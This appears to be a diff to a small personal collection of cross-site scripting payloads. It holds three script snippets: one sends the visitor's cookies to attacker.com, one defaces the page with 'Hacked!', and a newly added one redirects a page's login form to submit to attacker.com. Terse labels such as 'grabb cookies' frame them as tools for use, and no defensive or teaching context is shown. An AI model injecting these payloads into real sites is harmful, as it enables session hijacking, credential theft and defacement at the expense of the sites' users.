@@ -2,3 +2,5 @@ grabb cookies
 <script>document.location='http://attacker.com/stealcookies?cookie='+document.cookie;</script>
 change text 
 <script>document.body.innerHTML = '<h1>Hacked!</h1>'; </script>
+grabb data login form
+<script>document.forms[0].action='http://attacker.com/stealdata';</script>
